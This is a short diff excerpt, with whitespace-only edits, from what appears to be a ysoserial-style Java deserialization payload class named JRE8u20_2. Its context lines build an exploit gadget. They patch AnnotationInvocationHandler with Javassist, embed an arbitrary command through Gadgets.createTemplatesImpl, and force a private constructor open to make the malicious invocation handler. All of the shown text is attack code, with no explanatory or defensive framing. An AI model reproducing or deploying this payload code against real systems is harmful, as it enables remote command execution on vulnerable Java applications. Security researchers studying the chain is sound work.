@@ -19,8 +19,8 @@ import java.util.Map;
 
 public class JRE8u20_2 implements ObjectPayload<Object> {
     public static Class newInvocationHandlerClass() throws Exception {
-        ClassPool pool  = ClassPool.getDefault();
-        CtClass   clazz = pool.get(Gadgets.ANN_INV_HANDLER_CLASS);
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(Gadgets.ANN_INV_HANDLER_CLASS);
         CtMethod writeObject = CtMethod.make("    private void writeObject(java.io.ObjectOutputStream os) throws java.io.IOException {\n" +
                 "        os.defaultWriteObject();\n" +
                 "    }", clazz);
@@ -35,7 +35,7 @@ public class JRE8u20_2 implements ObjectPayload<Object> {
         final Object templates;
         templates = Gadgets.createTemplatesImpl(command);
 
-        Class       ihClass     = newInvocationHandlerClass();
+        Class ihClass = newInvocationHandlerClass();
         Constructor constructor = ihClass.getDeclaredConstructor(Class.class, Map.class);
         constructor.setAccessible(true);
         InvocationHandler ih = (InvocationHandler) constructor.newInstance(Override.class, new HashMap<>());
